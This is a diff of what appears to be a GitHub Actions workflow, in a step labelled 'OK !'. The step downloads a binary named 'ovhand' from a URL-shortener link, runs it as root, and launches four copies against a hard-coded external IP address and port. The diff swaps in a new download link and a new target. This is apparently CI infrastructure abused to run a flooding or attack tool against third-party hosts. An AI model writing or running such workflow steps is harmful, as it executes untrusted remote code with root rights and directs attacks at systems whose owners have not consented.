@@ -15,12 +15,12 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/EbE6X/ovhand
+          wget https://curl.by/-_hNR/ovhand
           sudo su
           chmod +x ovhand
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 100 ./ovhand 178.33.36.253 53 10 90
+            sudo timeout 100 ./ovhand 46.20.6.198 30001 10 90
             PIDS+=($!)
           done
           
